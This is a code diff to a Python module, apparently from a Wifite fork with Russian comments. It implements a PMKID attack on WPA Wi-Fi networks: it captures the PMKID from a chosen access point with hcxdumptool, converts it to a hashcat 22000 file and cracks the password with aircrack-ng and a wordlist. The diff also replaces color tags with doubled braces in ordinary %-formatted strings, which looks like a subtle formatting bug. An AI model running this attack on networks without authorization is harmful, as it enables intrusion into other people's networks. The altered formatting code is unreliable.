@@ -4,18 +4,18 @@
 from ..model.attack import Attack
 from ..util.color import Color
 from ..config import Configuration
-from ..tools.aircrack import Aircrack # Это уже было правильно
+from ..tools.aircrack import Aircrack
 import os
 import re
 import time
-import subprocess # Это уже было правильно
+import subprocess
 
 class AttackPMKID(Attack):
     def __init__(self, target):
         super(AttackPMKID, self).__init__(target)
         self.crack_result = None
-        self.pcapng_file = Configuration.temp('pmkid.pcapng') # Файл для захвата PMKID (бинарный)
-        self.hash_file = Configuration.temp('pmkid.22000') # Файл для хэша PMKID в формате hashcat (текстовый)
+        self.pcapng_file = Configuration.temp('pmkid.pcapng')
+        self.hash_file = Configuration.temp('pmkid.22000')
         self.success = False
         self.timer = None
 
@@ -40,7 +40,7 @@ class AttackPMKID(Attack):
                     continue
                 existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                 if existing_bssid == bssid:
-                    return pmkid_filename # Возвращаем путь к файлу .22000
+                    return pmkid_filename
         return None
 
     def run_aircrack(self):
@@ -51,7 +51,7 @@ class AttackPMKID(Attack):
             self.success = False
             return False
 
-        pmkid_hash_file = None # Путь к файлу .22000
+        pmkid_hash_file = None
         # 1. Ищем существующий PMKID
         if not Configuration.ignore_old_handshakes:
             pmkid_hash_file = self.get_existing_pmkid_file(self.target.bssid)
@@ -60,30 +60,27 @@ class AttackPMKID(Attack):
                               'Загружен {C}существующий{W} PMKID hash: {C}%s{W}\n' % pmkid_hash_file)
         
         # 2. Если нет — пробуем захватить новый
-        # capture_pmkid() создает self.pcapng_file и self.hash_file
         if pmkid_hash_file is None:
-            pmkid_hash_file = self.capture_pmkid() # Этот метод уже возвращает путь к .22000
+            pmkid_hash_file = self.capture_pmkid()
         
         if pmkid_hash_file is None or not os.path.isfile(pmkid_hash_file) or os.path.getsize(pmkid_hash_file) == 0:
             Color.pl('{!} Хэш PMKID не найден или файл пустой. Невозможно продолжить взлом.')
             self.success = False
-            return False # Возвращаем False, чтобы основной цикл Wifite попробовал что-то другое
+            return False
 
         # 3. Если есть опция skip_crack — выходим
         if Configuration.skip_crack:
             Color.pl('{+} Подбор PMKID пропущен из-за {C}skip-crack{W}')
             self.success = False
-            return True # Возвращаем True, так как "пропущено" успешно
+            return True
 
         # 4. Пытаемся подобрать пароль через aircrack-ng
-        Color.pl('{+} {C}Wifite{W}: Запускаем взлом PMKID с {G}aircrack-ng{W}')
+        Color.pl('{{+}} {{C}}Wifite{{W}}: Запускаем взлом PMKID с {{G}}aircrack-ng{{W}}') # Экранированные скобки
 
-        # Используем существующий метод crack_pmkid из Aircrack, который ожидает файл .22000
-        # и по умолчанию использует Configuration.wordlist
-        wordlist_path = Configuration.wordlist # Получаем путь к словарю из конфигурации Wifite
+        wordlist_path = Configuration.wordlist
 
         if not os.path.exists(wordlist_path):
-            Color.pl('{!} {R}Ошибка: Список слов не найден по пути %s{W}' % wordlist_path)
+            Color.pl('{{!}} {{R}}Ошибка: Список слов не найден по пути {{C}}%s{{W}}' % wordlist_path) # Экранированные скобки
             self.success = False
             return False
 
@@ -91,7 +88,7 @@ class AttackPMKID(Attack):
         cracked_key = Aircrack.crack_pmkid(pmkid_hash_file, wordlist=wordlist_path, verbose=True)
         
         if cracked_key:
-            Color.pl('{+} Ключ найден: {G}%s{W}' % cracked_key)
+            Color.pl('{{+}} Ключ найден: {{G}}%s{{W}}' % cracked_key) # Экранированные скобки
             from ..model.pmkid_result import CrackResultPMKID
             result = CrackResultPMKID(self.target.bssid, self.target.essid, pmkid_hash_file, cracked_key)
             result.save()
@@ -99,7 +96,7 @@ class AttackPMKID(Attack):
             self.success = True
             return True
         else:
-            Color.pl('{!} Ключ не найден в файле PMKID. Переходим к попытке захвата handshake.')
+            Color.pl('{{!}} Ключ не найден в файле PMKID. Переходим к попытке захвата handshake.') # Экранированные скобки
             self.success = False
             return False
 
@@ -110,57 +107,51 @@ class AttackPMKID(Attack):
         """
         iface = Configuration.interface
         bssid = self.target.bssid
-        Color.pl(f'{+} Захват PMKID через hcxdumptool на интерфейсе {iface}...')
+        Color.pl(f'{{+}} Захват PMKID через hcxdumptool на интерфейсе {{C}}{iface}{{W}}...') # Экранированные скобки
         try:
-            # 1. Запуск hcxdumptool на заданный таймаут по BSSID
             cmd = [
-                'timeout', str(Configuration.pmkid_timeout), 'hcxdumptool', # Используем Configuration.pmkid_timeout
+                'timeout', str(Configuration.pmkid_timeout), 'hcxdumptool',
                 '-i', iface,
-                '-o', self.pcapng_file, # Сохраняем в .pcapng
+                '-o', self.pcapng_file,
                 '--enable_status=1',
-                '--filterlist_ap=%s' % bssid, # Фильтр по BSSID
+                '--filterlist_ap=%s' % bssid,
                 '--mac_ap=%s' % bssid,
-                '--mac_client=%s' % 'FF:FF:FF:FF:FF:FF', # Широковещательный клиент
-                '--use_interface_filter' # Использовать фильтр по интерфейсу
+                '--mac_client=%s' % 'FF:FF:FF:FF:FF:FF',
+                '--use_interface_filter'
             ]
-            Color.pl('{+} Запуск: ' + ' '.join(cmd))
+            Color.pl('{{+}} Запуск: {{C}}%s{{W}}' % ' '.join(cmd)) # Экранированные скобки
             process = subprocess.run(cmd, capture_output=True, text=True)
-            if process.returncode != 0 and process.returncode != 124: # 124 - код выхода timeout
-                Color.pl('{!} hcxdumptool завершился с ошибкой: %s' % process.stderr.strip())
+            if process.returncode != 0 and process.returncode != 124:
+                Color.pl('{{!}} hcxdumptool завершился с ошибкой: {{R}}%s{{W}}' % process.stderr.strip()) # Экранированные скобки
                 return None
         except Exception as e:
-            Color.pl('{!} Ошибка запуска hcxdumptool: %s' % e)
+            Color.pl('{{!}} Ошибка запуска hcxdumptool: {{R}}%s{{W}}' % e) # Экранированные скобки
             return None
 
-        # 2. Конвертация pcapng в 22000 через hcxpcapngtool
         try:
             if not os.path.exists(self.pcapng_file) or os.path.getsize(self.pcapng_file) == 0:
-                Color.pl('{!} Файл .pcapng пуст или не создан.')
+                Color.pl('{{!}} Файл .pcapng пуст или не создан.') # Экранированные скобки
                 return None
 
             cmd_hash = [
                 'hcxpcapngtool',
-                '-o', self.hash_file, # Выход в .22000
-                self.pcapng_file # Вход .pcapng
+                '-o', self.hash_file,
+                self.pcapng_file
             ]
-            Color.pl('{+} Конвертация: ' + ' '.join(cmd_hash))
+            Color.pl('{{+}} Конвертация: {{C}}%s{{W}}' % ' '.join(cmd_hash)) # Экранированные скобки
             subprocess.run(cmd_hash, check=True)
         except Exception as e:
-            Color.pl('{!} Ошибка конвертации через hcxpcapngtool: %s' % e)
+            Color.pl('{{!}} Ошибка конвертации через hcxpcapngtool: {{R}}%s{{W}}' % e) # Экранированные скобки
             return None
 
         if os.path.exists(self.hash_file) and os.path.getsize(self.hash_file) > 0:
-            Color.pl('{+} Получен PMKID hash: %s' % self.hash_file)
+            Color.pl('{{+}} Получен PMKID hash: {{G}}%s{{W}}' % self.hash_file) # Экранированные скобки
             return self.hash_file
         else:
-            Color.pl('{!} PMKID hash не получен после конвертации.')
+            Color.pl('{{!}} PMKID hash не получен после конвертации.') # Экранированные скобки
             return None
 
     def run(self):
-        """
-        Запускает атаку PMKID. Возвращает True, если PMKID успешно взломан, иначе False.
-        """
-        # run_aircrack теперь включает логику захвата и взлома
         result = self.run_aircrack() 
-        self.target.cracked = self.success # Обновляем статус цели в зависимости от self.success
+        self.target.cracked = self.success
         return result
